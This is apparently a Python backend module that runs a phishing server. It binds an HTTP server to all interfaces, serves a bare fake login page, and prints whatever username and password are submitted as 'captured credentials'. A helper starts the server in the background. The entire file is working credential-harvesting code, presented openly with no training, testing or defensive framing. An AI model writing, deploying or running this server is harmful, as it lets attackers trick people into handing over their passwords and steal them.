# backend/services/phishing.py

from http.server import HTTPServer, BaseHTTPRequestHandler
import threading

class PhishingHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        html = "<html><body><h2>Login Page</h2><form method='POST'><input name='user'><input name='pass' type='password'><input type='submit'></form></body></html>"
        self.wfile.write(html.encode())

    def do_POST(self):
        length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(length).decode()
        print("[Phishing] Captured credentials:", post_data)
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"Captured")

def start_phishing_server(port=8080):
    server = HTTPServer(('0.0.0.0', port), PhishingHandler)
    threading.Thread(target=server.serve_forever, daemon=True).start()
    return {"status": "Phishing server running on port %s" % port}
